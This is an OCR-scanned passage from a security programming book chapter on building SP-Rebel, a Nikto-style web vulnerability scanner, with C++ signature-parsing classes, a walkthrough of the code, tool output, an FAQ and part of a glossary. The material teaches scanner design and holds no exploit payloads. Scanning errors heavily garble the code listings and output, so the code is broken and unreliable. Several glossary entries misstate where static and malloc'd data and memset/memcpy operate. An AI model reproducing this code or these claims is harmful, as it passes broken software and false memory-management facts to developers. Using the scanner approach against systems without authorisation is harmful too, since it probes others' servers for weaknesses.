21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
50 
61 
62 
63 
tinclude <stdio.h> 
#inclu(3e "VulnDBEntry. h" 
#define VDBE_FIELD_TYPE 
0x0000 
#define VDBE_FIELD_PATH 
0x0001 
tdefine VDBE_FIELD„RES 
0x0002 
tdefine VDBE_FIELD_METH 
0x0003 
(define VDBE_FIELD_DESC 
0x0004 
* VulnDBEntry!) 
'/ 
VulnDBEntry::VulnDBEntry() 
{ 
; 
* -VulnDBEntry!) 
VulnDBEntry::-VulnDBEntry() 
InitO 
// parse states 
tt define VDBE_BEGTOK 
tdefine VDBE_INTOK 
•define VDBE_ENDTOK 
tdefine VDBE_NXTTOK 
(define V D B E _ E S C 
0x0001 
0x0002 
0x0003 
0x0004 
0x0005 
bool VulnDBEntry::Init(char *entry) 
{ 
s t r i n g 
c h a r 
i nl 
i nt 
i n t 
i :it 
L :"p; 
r.h 
St 
c n t 
I en 
i rix 
= 
= 
= 
= 
= 
•
;
-
. 
: • : 
3 : 
0 ; 
:)r 
// format 
// #type #path 
#to>: #meth #desc 
// "iis",V_vti_biny_vti_cnf/*,"200*,"GET","frontpage, 
\"directory found. 
if(entry == NULL) 
{ 
return(false) ; 

Creating a Web Security Tool • Chapter 14 
611 
64 
) 
65 
66 
len = strlen{entry); 
67 
68 
ifUen <= 0) 
69 
{ 
70 
71 
} 
72 
73 
SC = VDBE_BEGTOK; 
74 
75 
while (idx < len) 
76 
{ 
77 
78 
79 
switch(st) 
80 
{ 
81 
case VDBE_BEGTOK: 
82 
S3 
++idxj 
84 
85 
/ / a l l o w for leading white space 
86 
if (ch == • • 
|| 
87 
ch == ' \ f 
| 
88 
ch == >\n' | 
89 
ch == 
'\v"i 
90 
( 
91 
break; 
92 
} 
93 
94 
// beginning of field 
95 
if [ch == ' \ - ' ) 
96 
( 
97 
// opening • 
98 
St = VDBE_INTOK; 
99 
break; 
100 
} 
101 
102 
// invalid char 
103 
return(false); 
104 
105 
break; 
106 
1 0 7 
c a s e 
VDBE_INTOK: 
108 
109 
// c l o s i n g • 
{dont i n c idx) 
110 
if [ch == ' \ " ) 
1 1 1 
( 
112 
St = VDBE_ENDTOK; 
113 
break; 
114 
} 
115 
116 
+ + idx; 
117 
118 
// escape char 
119 
if<ch == ' \ \ ' ) 
120 
( 

612 
Chapter 14 * Creating a Web Security Tool 
121 
St = VDBE_ESC; 
1 2 2 
break; 
1 2 3 
} 
124 
1 2 5 
/ / 
save char 
1 2 6 
tmp + = ch; 
1 2 7 
1 2 8 
break; 
1 2 9 
1 3 0 
case VDBE_ENDTOK: 
131 
132 
133 
1 3 4 
/ / 
save value 
1 3 5 
m _ s t r ( c n t ) 
• tmp; 
1 3 6 
tmp 
- "" ; 
137 
1 3 8 
/ / 
a l l f i e l d s parsed 
1 3 9 
++cnt; 
1 4 0 
i f l c n t == VDBE_FIELD_CNT) 
141 
{ 
1 4 2 
r e t u r n ( t r u e ) ; 
1 4 3 
} 
1 4 4 
1 4 5 
// move 
to next field 
1 4 6 
SC = VDBE_NXTTOK; 
1 4 7 
1 4 8 
break; 
1 4 9 
1 5 0 
case VDBE_ESC: 
151 
1 5 2 
/ / 
hack t o d e a l w i t h DOS-style d r i v e s 
153 
//Cc:\') 
1 5 4 
i f ( e n t r y [ i d x - 2] 
== 
• ; ' ) 
155 
{ 
1 5 6 
if ( e n t r y ( i d x ) 
== 
' \ V ) 
157 
( 
1 5 8 
+ 4-idx; 
1 5 9 
tmp += 
' W ; 
1 6 0 
St 
VDBE_INTOK; 
161 
break; 
1 6 2 
} 
1 6 3 
e l s e i £ [ e n t r y ( i d x ) 
== 
, \ » " ) 
164 
{ 
1 6 5 
++idx; 
1 6 6 
i f ( i d x < len) 
1 6 7 
{ 
1 6 8 
if ( e n t r y ! idxl 
== • , • ) 
1 6 9 
{ 
1 7 0 
trap 
+= 
•W; 
171 
st 
VDBE_ENDTQK; 
1 7 2 
} 
1 7 3 
e l s e 
174 
{ 
1 7 5 
tmp += 
\ " ' ; 
1 7 6 
St 
= VDBE_1N'MK; 
1 7 7 
) 

Creating a Web Security Tool • Chapter 14 
613 
178 
179 
180 
181 
182 
183 
184 
185 
186 
187 
188 
189 
190 
191 
192 
193 
194 
195 
196 
197 
198 
199 
200 
201 
202 
203 
204 
205 
206 
207 
208 
209 
210 
211 
212 
213 
214 
215 
216 
217 
218 
219 
220 
221 
222 
223 
224 
225 
226 
227 
228 
229 
230 
231 
232 
233 
234 
.-' 
) 
else 
( 
break; 
tmp += ' W 
} 
tmp += ch; 
St 
= VDBE_INTOK; 
++idx; 
break; 
case VDBE_NXTTOK: 
++idx; 
i£[ch == ' 
( 
St = VDBE_BEGTOK; 
} 
break; 
} 
} 
printf("\r\n*** FAILED TO PARSE: %s\r\n\r\n", entry); 
return(false); 
* GetTypeO 
-
.
• 
string VulnDBEntry::Getrype{} 
{ 
return(m_str[VDBE_FiELD_TYPE]); 
* GetPathO 
V 
string VulnDBEntry::GetPath() 
{ 
: • 
/* 
return(m_str[VDBE_FIELD_PATHj); 
GetResult() 

614 
Chapter 14 * Creating a Web Security Tool 
235 « 
236 
v 
2 3 7 s t r i n g 
VulnDBEntry::GetReSult() 
238 { 
2 3 9 
r e t u r n l m _ s t r [VDBE_FIELD_RES 
] ) ; 
240 j 
241 
242 /« 
243 
* GetMethodO 
244 > 
245 * 
246 «/ 
247 string VulnDBEntry::GetMethod() 
248 { 
249 
returnfm_str[VDBE_FIELD_METH)); 
250 } 
251 
252 /-
253 
* GetDescO 
254 * 
255 -
2 5 6 '•; 
257 string VulnDBEntry::GetDesc(I 
258 • 
2 5 9 
r e t u r n [ m _ s t r [VDBE_FIELD_DESC1 I ; 
260 } 
Analysis 
At lines 1 1 through 15, tokens are defined to be used as parsed data types for the init 
function of the class. 
At lines 17 through 33, the constructor and destructor are defined.These two 
methods do not execute any variable initializations or presets. Unlike the VnhiDB class, 
there are no dynamic data members, so the definition of constructors and destructors is 
less important. 
In lines 35 through 210, the Init function is defined. Like the Init function in 
VttlnDB, the Init function in VulnDBEntry is the core parsing function. 
In order to understand the parser, it is important to track the flow of the local vari-
ables. The variable tmp is a string that stores the current field being worked on. The vari-
able st defines the token we will be using. This is important for the switch statement in 
line 79. The cnt is used to track the number of fields currently completed. Once the 
count reaches VBE_FIELI)_CNT ( 5 ), the function returns true for a successful parse. 
The variable leu tracks the length of the entry string and the variable idx tracks the cur-
rent position in the entry string. 
In lines 61 through 71, empty strings are detected, causing the function to return 
false. 
At line 73, our token tracker ,^f is set to VDBE_BEGTOK.This is important for the 
switch statement. 

Creating a Web Security Tool • Chapter 14 
615 
At line 75, a while loop is set to continue as long as the index is less then the length 
of the entry string. The first process of this loop is to read a character from entryhdxj 
into ch. This process is always performed at the beginning of the loop. 
At line 79, the switch statement takes over. This switch consists of five possible token 
sets. Each of these five sets is used to parse the data from the entry with different rules 
determined in the case. 
• 
VDBE_BEGTOK (Field Begin Token) 
1. At line 83, increment the index to reference the next character in the 
string. 
2. Since each field in an entry begins and ends with a double quote, this 
token continually grabs whitespace until a double quote is pulled (line 95). 
If for some reason it pulls a character other than whitespace or a double 
quote, the function will return false because of a failure to parse. 
3. Once a double quote is found, the token tracker is set to VDb*E_INTOK 
(line 98). 
• 
VDBEJNTOK (Token parses data inside of the field) 
4. 
If a double quote is found inside of INTOK, it changes the token tracker 
st to VDBE_ENDTOK (line 112) and the loop restarts at the ENDTOK. 
5. At line 116, increment the index to reference the next character in the 
string. 
(•>. If an escape character 'Y is found, switch the token tracker to VDBE_ESC 
and go to the beginning of the loop. 
7. Otherwise, we have a normal character at line 126, so add the value of ch 
to the string tmp. Afterward, continue the loop with the token tracker at 
INTOK. 
• 
VDBE_ENDTOK (Field Ending Token) 
8. At line 135, make the string in the m_str array equal to the current tmp 
string. Then reset the tmp string and increment the field counter. 
9. At line 140, if the counter is equal to the number of fields 
(VDBE_FIELD_CNT), the parsing has gone successfully and the function 
returns true. 
10. Otherwise, set the token tracker to VD13E_NXTTOK and continue the 
parsing loop. 
• 
VDBE_ESC (Escape Character Handling Token) 
1 1. At line 154, if an escape character is found, make sure the previous valid 
character is not a colon. If it is, DOS-style drives must be handled in the 
parse. 

616 
Chapter 14 * Creating a Web Security Tool 
12. At line 156, if the current ch is determined to identify a DOS-style drive, 
add \ to the path and set the token tracker to VDBE_INTOK. Afterward, 
continue parsing as normal. 
13. At line 163, if the character after the":" is supposed to be a "," (line 168), 
then check the next character to see if it is a comma. If it is a comma, add 
a backslash to the string tmp and set the token tracker to 
VDBE_ENDTOK. Otherwise (line 173), add a quote to the string tmp 
and set the token tracker to VDBE_INTOK. 
At line 182, if neither a \ nor a double quote was found after the colon, add an 
escape character to the string and then add the ch to the string. Set the token tracker to 
VDBE_JNTOK, increment the index, and continue parsing. 
• 
VDBE_NXTTOK (Next Field Token Handler) 
14. At line 196, increment the index through the parsing loop until the char-
acter is a comma.Then set the token tracker to VDBE_BEGTOK and 
continue parsing. 
15. At line 207, if the parsing loop ever exits without being completely parsed 
and returning true from ENDTOK, the parsing failed. This means that a 
parsing error will be printed and the function will return false. 
16. At lines 212 through 260, the field accessor methods are defined.Theses 
methods give access to the fields parsed by in it. Fields include type (line 
217), path (line 227), result (line 237), method (line 247), and description 
(line 257). 
Header files are used to define classes and declare data members and member func-
tions (methods) for the class. Each header begins with a statement similar to line 8 of the 
VulnDB.li file which prevents the definition of the class multiple times even if it is 
included is several files in a program. If a class is not defined, it will be defined and made 
available for use in the program code. 
Header Files 
The VulnDB.h file defines the class VuliiDB. Each of its methods is described in detail 
in the previous sec don. The class contains one private data member, 
vector<VulnDBEntry *> m_vec.This member is used to store a dynamic amount of 
ViiiiiDBBniry objects.This class makes the logical processing of the vulnerability database 
possible. 
i r N | fl L i i 
* 
^ ^ D 
2 
• VulnDB.h 
3 
* 
4 
-
5 
* 
6 
v 
7 
8 
#if ! defined I 
VULNDB_H_) 
9 
#define 
VULNDB_H 

Creating a Web Security Tool • Chapter 14 
617 
10 
11 #include <vector> 
12 using std::vector; 
13 
14 
((include "VulnDBEntry.h" 
15 
1 6 f* 
17 * 
1 8 
* VULNDB CLASS 
19 * 
20 */ 
21 
class VulnDB 
22 { 
23 
public: 
24 
25 
/« 
26 
* VulnDBO 
27 
28 
29 
*/ 
30 
VulnDBO; 
31 
32 
/* 
33 
* -VulnDBO 
34 
35 
36 
*/ 
37 
-VulnDBO ; 
38 
39 
/* 
40 
* InitO 
41 
42 
43 
v 
44 
bool Init[string filename); 
45 
46 
/« 
47 
* Sized 
48 
49 
50 
v 
51 
int Siie( I ; 
52 
53 
/* 
54 
* GetEntryO 
55 
56 
57 
*/ 
58 
VulnDBEntry *GetEntry(int idx); 
59 
60 
private: 
61 
62 
vector^VulnDBEntry *> m_vec; 
63 
64 >; 
65 
66 
#endif /* 
VULNDB_H 
*/ 

618 
Chapter 14 * Creating a Web Security Tool 
The VulnDBEntry.h file defines the class VulnDBEntry. Like the VithiDB class, each 
of the VulnDBEntry methods are described in detail in the previous section. The class 
contains one private data member, string m_str[VI)BE_FIELl)_CNT|.This member is 
used to store five different strings containing field info for vulnerability signatures.These 
fields are type, path, result, method, and description. This class parses each of the vulnera-
bility signatures and makes its fields accessible to the "packet cannon." 
i v N f a s s s 
1 
/ * 
2 
* VulnDBEntry.h 
4 
* 
5 
< 
6 
*/ 
7 
8 
# i £ ! defined ( 
VULNDBENTRY_H_) 
9 
*deftne 
VULNDBENTRi_H_ 
10 
1 1 
^ i n c l u d e <:string> 
1 2 
using a t d : : s t r i n g ? 
13 
14 
Sdenne VDBE_FIELD_CNT 
0x0005 
15 
16 /. 
17 
* 
18 
* VULMDBENTRV CLASS 
19 • 
20 
v 
21 class VulnDBEntry 
22 { 
23 public: 
24 
25 
/* 
26 
* VulnDBEntry!) 
27 
28 
29 
v 
30 
VulnDBEntry () ; 
31 
32 
/• 
33 
* -VulnDBEntry0 
3 4 
3 5 
3 6 
v 
37 
-VulnDBEntry(); 
38 
3 9 
/* 
40 
* I n i t O 
41 
42 
43 
v 
44 
bool 
I n i t { c h a r 
*entry)j 
45 
46 
/* 
47 
* GetHethod() 
4 8 
49 

Creating a Web Security Tool • Chapter 14 
619 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
76 
77 
78 
79 
80 
81 
82 
83 
84 
85 
86 
87 
*/ 
string GetMethodO; 
/* 
* GetPathO 
* 
* 
*
.
-
• 
s t r i n g GetPatM ) ; 
/* 
* G e t R e s u l t O 
* 
-
• 
s t r i n g 
G e t R e s u l t U ; 
t* 
* GetDescO 
* 
« 
*,' 
s t r i n g 
G e t D e s c O ; 
t* 
* GetTypeO 
* 
* 
*/ 
s t r i n g GetTypeO; 
p r i v a t e : 
s t r i n g 
m_str[VDBE_FIELD_CNT] 
•
: 
#endif /* 
VULNDBENTRY_H_ */ 
Compilation 
This program was created to compile using Microsoft's Visual Studio. We utilized a fully 
patched yet standard version of Visual Studio C++ 6.0. To compile, you merely need to 
create a project that includes all of these files, generate a workspace, and then build and 
compile. All compile-time libraries included within the code utilize Pragma comments, 
thereby allowing the user the ability to not manually link them through Microsoft's 
visual interface. 
Execution 
The following is the usage output screen that is displayed upon program execution or 
when the improper usage is passed as a command-line parameter. As you will note, in its 
current state, the program is easy to use and was developed in a very simplistic manner. 

620 
Chapter 14 * Creating a Web Security Tool 
The Usage Screen 
Webserver Scanner by the Author's of Advanced Security Programming: Price, Foster, and 
Tommy 
We use CIRT's awesome and freely available VulnDB! 
Usage: sprebel.exe hostname <port> <0|1> <bufsize> 
<0> • Default, Minimal Output 
<1> = Verbose Output - show me the request and response buffer 
Output of SP-Rebel running in the default mode is shown in Example 14.1. As you 
will note, multiple fields are displayed when a successful attack against the target is iden-
tified. The output mechanism we designed specifies the target IP address, port number, 
and the HTTP request (GET or POST) that received a 200 Ok or other signature-spec-
ified response. As you can see, we intentionally cut off the bottom of the output screen 
since we didn't feel it necessary to show you the hundreds of successful attack requests 
that come back on an old unpatched version of Apache for Windows. 
Tool Output 
C:\sp-rebel.exe 10.3.200.3 8080 
using host/addr: 10.3.200.3; port: 8080; output: 0; 
TARGET: 10.3.200.3 % 8030, SUCCESSFUL ATTACK REQUEST 
TARGET: 10.3.200.3 @ 3080, SUCCESSFUL ATTACK REQUEST 
TARGET: 10.3.200.3 @ 3080, SUCCESSFUL ATTACK REQUEST 
TARGET: 10.3.200.3 @ 3080, SUCCESSFUL ATTACK REQUEST 
TARGET: 10.3.200.3 8 8080, SUCCESSFUL ATTACK REQUEST 
TARGET: 10.3.200.3 S 8080, SUCCESSFUL ATTACK REQUEST 
TARGET: 10.3.200.3 @ 3080, SUCCESSFUL ATTACK REQUEST 
TARGET: 10.3.200.3 @ 8080, SUCCESSFUL ATTACK REQUEST 
TARGET: 10.3.200.3 @ 3080, SUCCESSFUL ATTACK REQUEST 
TARGET: 10.3.200.3 @ 8080, SUCCESSFUL ATTACK REQUEST 
TARGET: 10.3.200.3 @ 8080, SUCCESSFUL ATTACK REQUEST 
TARGET: 10.3,200.3 @ 8080, SUCCESSFUL ATTACK REQUEST 
cut off due to space constraints. . . , 
bufsize: 1024; 
GET 
GET 
GET 
GET 
GET 
GET 
: ; ; ; • • : ' 
GET 
GET 
GET 
GET 
GET 
/ HTTP/1.0 
/icons/ HTTP/1 
/index.html 
/index.html 
/index.html 
/index.html 
/index.html 
/index.html 
/index.html 
/index.html 
/index.html 
/index.html 
Cd 
i.:: 
6s 
dk 
oc 
;>l 
LIT. 
efi 
e:. 
fr 
0 
HTTP/1 0 
iso8859-2 
HTTP/1 
HTTP/1 
HTTP/1 
HTTP/1 
HTTP/1 
HTTP/1 
HTTP/1 
HTTP/1 
0 
0 
0 
0 
0 
0 
0 
0 

Creating a Web Security Tool * Chapter 14 
621 
Summary 
Web applications have become a part of everyday society in the past decade and even 
the newest and most advanced technology barely raises an eyebrow on everyday users 
surfing the net. The vulnerabilities that are searched for by this tool reside on a layered 
architecture that is known to have rampant vulnerabilities plaguing both the business 
and government worlds alike. 
This chapter represents a culmination of some of the programming and security 
techniques we've introduced and detailed throughout the book.The chapter was dedi-
cated solely to creating a tool from the ground up to accomplish a particular function, 
or in our case, to take a function of a best-in-class freeware tool (Nikto) and enhance it 
in terms of code efficiency, runtime speed, and overall CPU utilization. The chapter cov-
ered real implementations of data parsing, dynamic data computations, logic trees, 
sockets, and Web security vulnerability analysis. With the code and analysis provided, 
along with the skills previously covered in the book, you should now be able to under-
stand the code to the extent that you can easily modify it. Features such as additional 
output modes, bandwidth throttling, allow for custom rules via a more dynamic parser, 
additional response tokens for decreased false positives, and, lastly, error checking. 
Solutions Fast Track 
Design 
0 
The most critical aspect of developing any software application or program is 
to first properly design the application. Designing the application is no trivial 
task and should be carefully thought out. 
Signatures 
0 
Information security signature files have become a quasi-industry standard for 
most quick security tools. NMAP, Nikto, and SNORT are some of the more-
popular ones, and integrate text-based database files into their tools. 
0 
Signature files are an easy and flexible means of integrating text-based data 
into command-line applications. 
In-Depth Analysis 
0 
Reusable socket libraries and attack libraries will significantly lessen the total 
amount of code utilized in any given tool or application. 
www.syngress.com 

622 
Chapter 14 • Creating a Web Security Tool 
0 
Centralizing the common code base minimizes the work that goes into 
troubleshooting and eliminating logic bugs. 
Output 
0 
Iool output is commonly sent to standard out (STDOUT) in a text-based 
output format for command-line executable tools. 
Links to Sites 
For more information, go to the following Web sites: 
• 
www.applicationdefense.com Application Defense's Web site houses all the 
code, programs, and tools presented throughout this book. Please refer to this 
site for soft copies of the material. 
• 
www.cirt.net This is the CIRT home page. On the home page, you can find 
downloads for the Nikto scanning tool as well as the Nikto text-based 
database. 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQs at ITFAQnet.com. 
Q: How do Web-based vulnerabilities differ from stack overflows? Can a stack over-
flow be a Web vulnerability? 
A: Well, it really depends on how you define a Web-based vulnerability.There are 
predominantly three definitions for Web vulnerabilities. The first refers to Web 
server vulnerabilities—for example, an IIS or Apache vulnerability would be 
considered a Web vulnerability. In this case, a stack overflow could be a specific 
Web server vulnerability.The second definition commonly refers to any vulnera-
bility or security hole that can be leveraged across HTTP, while the last defini-
tion is what we utilized throughout the chapter. It refers to vulnerabilities of, or 
within, applications that reside atop of Web servers. For instance, an information 
disclosure vulnerability within Gabriel.cgi would fall into this category^. 
www.syngress.com 

Creating a Web Security Tool * Chapter 14 
623 
Ql Wouldn't the tool presented in this chapter have an enormous amount of false 
positives? 
A: Yes, the tool used here is only as good as the data that is parsed from within the 
text database. In nearly all cases, the text database merely looks for a HTTP 200 
OK response. 
Q: How can I minimize false positives within this scanner? 
A: There are two ways to cut down on errors or false responses from this tool. The 
first is to add multiple tokens to the Web fingerprint file that should be adequate 
for significantly minimizing false positives and false negatives.The second way of 
increasing the accuracy of this tool would be to add in a "pre-check" module 
that would learn the target system's auto responses for all potential HTTP codes, 
including error requests, moved pages, and restricted access. Afterward, apply and 
correlate these findings to the success responses—for instance, this technique 
would eliminate responses from servers that responded with a 200 OK for every 
request.This functionality will appear in the second release of the tool, along 
with a corresponding Artificial Intelligence Engine. 
Q: Most of the attack signatures seem to use HTTP 1.0 requests. Why don't they 
use HTTP 1.1? 
Al HTTP 1.1 has multiple enhancements over HTTP 1.0.The most significant and 
relevant to this scenario is that HTTP 1.1 can keep an HTTP session alive to 
send and receive multiple payloads without starting a new session. Utilizing this 
on certain scenarios could realize increases in performance; however, 1.0 is best 
suited to the type of scenario where attack payloads may have adverse effects on 
a target system. 
Q: What makes SP-Rebel better than Nikto? 
A: Well, right now, the only thing we could say is speed. SP-Rebel was completely 
written in Win32 C++ and compiled with Microsoft's Visual Studio. In future 
releases, the fact that it is written in C++ will allow us to access lower-level 
packet information, and during the AI execution period increase overall scan and 
execution times. 
Q: There was very little presented in the chapter about Web hacking techniques. 
Where can I get more information on how to enhance this scanner or database 
file? 
www.syngress.com 

624 
Chapter 14 • Creating a Web Security Tool 
The goal of this book was not to teach you everything about security or 
hacking, or to provide enough information that you understand how and why to 
write certain tools and the implementation utilized within those tools. There are 
numerous books and resources on the subject of Web hacking, including Web 
Hacking, Web Applications (Hacking Exposed), and the Open Web Application 
Security Project (OWASP) Web site. 
Can I reuse your code to write a scanner of my own? 
Of course but realize this code was released under full copyright and ownership 
of James C. Foster and Mike Price. Use the code, learn from it, modify it, just 
make your modifications public, open source, and send them back to us so that 
we can incorporate and give credit where credit is due. 
Why is this scanner written in C + + instead of C# or C? 
Unfortunately, there is no real good reason why this tool wasn't written in C#; 
we'll just cough it up to a new language that we're not head over heals for yet... 
As far as C goes, you may have noticed large portions of the code examples are 
written in C. We use C++ for its capability to implement C while still giving us 
object-oriented programming (which we are all fans of) for bigger endeavors; 
we find our end code much cleaner and easier to reuse when implementing the 
proper classes. 
www.syngress.com 

Appendix A 
Glossary 
+ 
625 n

626 
Appendix A* Glossary 
API An Application Programming Interface (API) is a program component that con-
tains functionality that programmers can use in their own program. 
Assembly Code Assembly is a low-level programming language with simplistic, but 
few, operations. When assembly code is "assembled," the result is machine code. Writing 
inline assembly routines in C/C++ code often produces a more efficient and faster 
application; however, the code is harder to maintain, less readable, and sometimes sub-
stantially longer. 
Big Endian On a big-endian system, the most significant byte is stored first. SPARC is 
an example of a big-endian architecture. 
Buffer A buffer is an area of memory allocated with a fixed size. It's commonly used as 
a temporary holding zone when data is transferred between two devices that are not 
operating at the same speed or workload. Dynamic buffers are allocated on the heap 
using malloc. When defining static variables, the buffer is allocated on the stack. 
Buffer Overflow A generic buffer overflow occurs when a buffer has been allocated 
and more data than expected was copied into it. The two classes of overflows include 
heap and stack overflows. 
Bytecode Bytecode is program code that is in between the high-level language code 
understood by humans and machine code read by computers. Bytecode is useful as an 
intermediate step for languages such as Java, which are platform-independent. Bytecode 
interpreters for each system interpret bytecode faster than is possible by fully inter-
preting a high-level language. 
C The C procedural programming language (originally developed in the early 1970s) is 
one of the most common languages in use today because of its efficiency, speed, sim-
plicity, and the control it gives the programmer over low-level operations. 
C++ C++ is a programming language that incorporates object-oriented features into 
the C language. While adding features such as inheritance and encapsulation, C++ 
retained many of C's popular features, including syntax and power. 
C# C# is the next-generation of the C/C++ languages. Developed by Microsoft as 
part of the .NET initiative, C# is intended to be a primary language for writing Web 
service components. While incorporating many useful Java features, such as platform-
independence, C# is a powerful programming tool for Microsoft Windows. 
Class Classes are discrete programming units in which object-oriented programs are 
organized. They are groups of variables and functions of a certain type. A class may con-
tain constructors, which define how an instance of that class, called an object, should be 
created. A class contains functions that are operations to be performed on instances of 
the class. 

Glossary* Appendix A 
627 
Compiler Compilers are programs that translate high-level program code into assembly 
language.They make it possible for programmers to benefit from high-level program-
ming languages, which include modern features such as encapsulation and inheritance. 
Data Hiding Data hiding is a feature of object-oriented programming languages. 
Classes and variables may be marked private, which restricts outside access to the internal 
workings of a class. In this way, classes function as "black boxes," and malicious users are 
prevented from using those classes in unexpected ways. 
Data Type A data type is used to define variables before they are initialized. The data 
type specifies the way a variable will be stored in memory and the type of data the vari-
able holds. 
Debugger A debugger is a software tool that either hooks in to the runtime environ-
ment of the application being debugged or acts similarly to (or as) a virtual machine for 
the program to run inside of. The software allows you to debug problems within the 
application being debugged. The debugger allows the end user to modify the environ-
ment, such as memory, that the application relies on and is present in. The two most 
popular debuggers arc gdb (included in nearly every open-source *nix distribution) and 
SoftlCE, which can be found at www.mimega.com. 
Disassembler Typically, a disassembler is a software tool used to convert compiled pro-
grams in machine code to assembly code.The two most popular disassemblers are obj-
dump (included in nearly every open-source *nix distribution) and the far more 
powerful IDA, which can be found at www.datarescue.com. 
DLL A Dynamic Link Library (DLL) is a file with an extension of"*.dH". A DLL is 
actually a programming component that runs on Win32 systems and contains function-
ality that is used by many other programs.The DLL makes it possible to break code into 
smaller components that are easier to maintain, modify, and reuse by other programs. 
Encapsulation Encapsulation is a feature of object-oriented programming. Using 
classes, object-oriented code is very organized and modular. Data structures, data, and 
methods to perform operations on that data are all encapsulated within the class struc-
ture. Encapsulation provides a logical structure to a program and allows for easy methods 
of inheritance. 
Exploit Typically, an exploit is a very small program that's used to trigger a software 
vulnerability that can be leveraged by the attacker. 
Exploitable Software B u g All vulnerabilities are exploitable; not all software bugs are 
exploitable. If a vulnerability were not exploitable, it would not be a vulnerability; it 
would simply be a software bug. Unfortunately, this fact is often confused when people 

628 
Appendix A* Glossary 
report software bugs as potentially exploitable because they have not done the adequate 
research necessary to determine if it is exploitable or not. To further complicate the situ-
ation, sometimes a software bug is exploitable on one platform or architecture, but is not 
exploitable on others. For instance, a major Apache software bug was exploitable in 
Win32 and BSD systems, but not in Linux systems. 
Format String Bug Format strings are used commonly in variable argument func-
tions such as printf, fprintf, and syslog.These format strings are used to properly format 
data when being output. In cases when the format string hasn't been explicitly defined 
and a user has the ability to input data to the function, a buffer can be crafted to gain 
control of the program. 
Function A function may be thought of as a miniature program. In many cases, a pro-
grammer may wish to take a certain type of input, perform a specific operation, and 
output the result in a particular format. Programmers have developed the concept of a 
function for such repetitive operations. Functions are contained areas of a program that 
may be idled to perform operations on data. They take a specific number of arguments 
and return an output value. 
Functional Language Programs written in functional languages are organized into 
mathematical functions. True functional programs do not have variable assignment; only 
lists and functions are necessary to achieve the desired output. 
GDB The GNU debugger (GDB) is the de facto debugger on UNIX systems. GDB is 
available at http://sources.redhat.com/gdb/. 
Heap The heap is an area of memory that is utilized by an application and allocated 
dynamically at runtime. Static variables are stored on the stack along with data allocated 
using the malloc interface. 
Heap Corruption Heap overflows are often more accurately referred to as heap cor-
ruption bugs because when a buffer on the stack is overrun, the data normally overflows 
into other buffers, whereas on the heap, the data corrupts memory that may or may not 
be important/useful/exploitable. Heap corruption bugs are vulnerabilities that take place 
in the heap area of memory. These bugs can come in many forms, including malloc 
implementation and static buffer overruns. Unlike the stack, many requirements must be 
met for a heap corruption bug to be exploitable. 
Inheritance Object-oriented organization and encapsulation allow programmers to 
easily reuse, or "inherit," previously written code. Inheritance saves time as programmers 
do not have to recode previously implemented functionality. 
Integer Wrapping In the case of unsigned values, integer wrapping occurs when an 
overly large unsigned value is sent to an application that "wraps" the integer back to 

Glossary* Appendix A 
629 
zero or a small number. A similar problem exists with signed integers; wrapping from a 
large positive number to a negative number, zero, or a small positive number. With 
signed integers, the reverse is true as well: a "large negative number" could be sent to an 
application that "wraps" back to a positive number, zero, or a smaller negative number. 
Interpreter An interpreter reads and executes program code. Unlike a compiler, the 
code is not translated into machine code, which is stored for later reuse. Instead, an 
interpreter reads the higher-level source code each time. An advantage of an interpreter 
is that it aids in platform-independence. Programmers do not need to compile their 
source code for multiple platforms. Every system that has an interpreter for the language 
will be able to run the same program code. The interpreter for the Java language inter-
prets Java bytecode and performs functions such as automatic garbage collection. 
Java Java is a modern object-oriented programming language developed by Sun 
Microsystems in the early 1990s. It combines a similar syntax to C and C++ with fea-
tures such as platform-independence and automatic garbage collection. Java applets are 
small Java programs that run in Web browsers to perform dynamic tasks impossible in 
static HTML. 
Little Endian Little and big endian are terms that refer to which bytes are the most 
significant. In a little-endian system, the least significant byte is stored first. x86 is a little-
endian architecture. 
Machine Language Machine code can be understood and executed by a processor. 
After a programmer writes a program in a high-level language, such as C, a coin pi ley 
translates that code into machine code. This code can be stored for later reuse. 
malloc The malloc function call dynamically allocates N number of bytes on the heap. 
Many vulnerabilities are associated with the way this data is handled. 
memset/memepy The memset function call is used to fill a heap buffer with a speci-
fied number of bytes of a certain character. The memepy function call copies a specified 
number of bytes from one buffer to another buffer on the heap. This function has similar 
security implication as strncpy. 
Method A method is another name for a function in languages such as Java and C#. A 
method may be thought of as a miniature program. In many cases, a programmer may 
wish to take a certain type of input, perform a specific operation, and output the result 
in a particular format. Programmers have developed the concept of a method for such 
repetitive operations. Methods are contained areas of a program that may be called to 
perform operations on data. They take a specific number of arguments and return an 
output value. 

630 
Appendix A * Glossary 
Multithreading Threads are sections of program code that may be executed in parallel. 
Multithreaded programs take advantage of systems with multiple processors by sending 
independent threads to separate processors for fast execution. Threads are useful when 
different program functions require different priorities. While each thread is assigned 
memory and CPU time, threads with higher priorities can preempt other less important 
threads. In this way, multithreading leads to faster, more responsive programs. 
NULL A term used to describe a programming variable that has not had a value set. 
Although it varies in each programming language, a NULL value is not necessarily the 
same as a value of"" or 0. 
Object-Oriented Object-oriented programming is a modern programming paradigm. 
Object-oriented programs are organized into classes. Instances of classes, called objects, 
contain data and methods that perform actions on that data. Objects communicate by 
sending messages to other objects, requesting that certain actions be performed.The 
advantages of object-oriented programming include encapsulation, inheritance, and data 
hiding. 
Off-by-One An "off-by-one" bug is present when a buffer is set up with size N and 
somewhere in the application, a function attempts to write N+1 bytes to the buffer.This 
often occurs with static buffers when the programmer does not account for a trailing 
NULL that is appended to the N-sized data (hence N+1) that is being written to the 
N-sized buffer. 
Platform-Independence Platform-independence is the idea that program code can 
run on different systems without modification or recompilation. When program source 
code is compiled, it may run only on the system for which it was compiled. Interpreted 
languages, such as Java, do not have such a restriction. Every system that has an inter-
preter for the language will be able to run the same program code. 
printf This is the most commonly used LIBC function for outputting data to a com-
mand-line interface. This function is subject to security implications because a format 
string specifier can be passed to the function call that specifies how the data being 
output should be displayed. If the format string specifier is not specified, a software bug 
exists that could potentially be a vulnerability. 
